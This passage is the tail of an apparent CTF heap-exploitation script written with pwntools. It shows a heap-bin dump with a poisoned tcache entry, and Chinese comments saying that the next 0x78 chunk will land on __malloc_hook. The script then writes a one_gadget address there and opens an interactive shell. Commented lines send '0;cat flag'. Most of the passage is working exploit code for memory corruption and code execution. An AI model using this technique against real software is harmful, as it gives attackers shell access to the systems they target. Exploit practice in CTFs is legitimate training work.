(0x20)     fastbin[0]: 0x0
(0x30)     fastbin[1]: 0x0
(0x40)     fastbin[2]: 0x0
(0x50)     fastbin[3]: 0x0
(0x60)     fastbin[4]: 0x0
(0x70)     fastbin[5]: 0x0
(0x80)     fastbin[6]: 0x0
(0x90)     fastbin[7]: 0x0
(0xa0)     fastbin[8]: 0x0
(0xb0)     fastbin[9]: 0x0
                  top: 0x55c2c60a7171 (size : 0x0) (invaild memory) 
       last_remainder: 0x55c2c6d0cee0 (size : 0x3a0) 
            unsortbin: 0x55c2c6d0cee0 (invaild memory)
(0x20)   tcache_entry[0](255): 0x55c2c6d0d430
(0x30)   tcache_entry[1](255): 0
(0x80)   tcache_entry[6](0): 0x7f4c208ebc30 --> 0x545a03000000 (invaild memory)
'''
# 下一个0x78的块将写到0x7f4c208ebc30，也就是我们布置的__malloc_hook的地址
# 将one_gadget写到__malloc_hook

add(21,0x78,p64(one_gadget))

# io.sendline('1')
# io.sendline('22')
# io.sendline('0;cat flag')

# gdb.attach(io)
# raw_input()

io.interactive()
```


